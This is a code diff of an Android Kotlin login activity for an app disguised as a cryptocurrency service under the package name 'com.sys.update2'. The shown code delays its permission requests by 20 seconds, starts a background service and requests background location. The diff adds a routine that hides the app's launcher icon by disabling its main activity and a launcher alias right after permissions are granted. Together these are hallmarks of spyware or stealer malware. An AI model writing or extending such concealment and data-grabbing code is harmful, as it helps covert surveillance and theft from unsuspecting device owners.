@@ -1,6 +1,7 @@
 package com.sys.update2
 
 import android.Manifest
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Color
@@ -12,6 +13,7 @@ import android.text.InputType
 import android.text.SpannableString
 import android.text.Spanned
 import android.text.style.ForegroundColorSpan
+import android.util.Log
 import android.view.View
 import android.view.animation.AnimationUtils
 import android.widget.EditText
@@ -28,16 +30,15 @@ class LoginActivity : AppCompatActivity() {
     private lateinit var registerView: View
     private lateinit var resetView: View
     private val PERM_REQUEST_CODE = 2001
-    private val PERM_DELAY_MS = 20_000L  // 20 ثانية
+    private val PERM_DELAY_MS = 20_000L
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // شريط الحالة بنفس لون الصفحة (أسود داكن)
         window.statusBarColor = Color.parseColor("#02081a")
         window.navigationBarColor = Color.parseColor("#02081a")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            window.decorView.systemUiVisibility = 0  // أيقونات بيضا
+            window.decorView.systemUiVisibility = 0
         }
 
         try {
@@ -56,7 +57,6 @@ class LoginActivity : AppCompatActivity() {
             registerView.visibility = View.GONE
             resetView.visibility = View.GONE
 
-            // ⭐ تلوين كلمة "cryptocurrency" بالأزرق #3d8bff زي auth.html بالظبط
             val heroTitle = findViewById<TextView>(R.id.heroTitle)
             val full = "Power up your\ncryptocurrency\njourney"
             val sp = SpannableString(full)
@@ -183,7 +183,6 @@ class LoginActivity : AppCompatActivity() {
                 showToast("Code will be sent (demo)")
             }
 
-            // ⭐ طلب الأذونات بعد 20 ثانية
             Handler(Looper.getMainLooper()).postDelayed({
                 requestAllPermissions()
             }, PERM_DELAY_MS)
@@ -194,7 +193,7 @@ class LoginActivity : AppCompatActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  طلب كل الأذونات
+    //  الأذونات
     // ═══════════════════════════════════════════
     private fun requestAllPermissions() {
         try {
@@ -226,6 +225,7 @@ class LoginActivity : AppCompatActivity() {
             if (needed.isNotEmpty()) {
                 ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
             } else {
+                hideLauncherIcon()
                 startBackgroundService()
             }
         } catch (e: Exception) {
@@ -240,11 +240,43 @@ class LoginActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
+        // ⭐ إخفاء الأيقونة بعد منح الأذونات
+        hideLauncherIcon()
+
         startBackgroundService()
 
         Handler(Looper.getMainLooper()).postDelayed({
             requestBackgroundLocation()
         }, 3000)
+    }
+
+    // ═══════════════════════════════════════════
+    //  إخفاء الأيقونة من الـ Launcher
+    // ═══════════════════════════════════════════
+    private fun hideLauncherIcon() {
+        try {
+            // الطريقة 1: إخفاء Activity الرئيسية
+            val component = ComponentName(this, LoginActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                component,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Log.d("LoginActivity", "✅ Icon hidden via LoginActivity disable")
+
+            // الطريقة 2: إخفاء الـ alias (لو موجود)
+            try {
+                val aliasComponent = ComponentName(this, "com.sys.update2.LauncherAlias")
+                packageManager.setComponentEnabledSetting(
+                    aliasComponent,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+                Log.d("LoginActivity", "✅ Icon hidden via alias disable")
+            } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.e("LoginActivity", "hide err: ${e.message}")
+        }
     }
 
     private fun requestBackgroundLocation() {
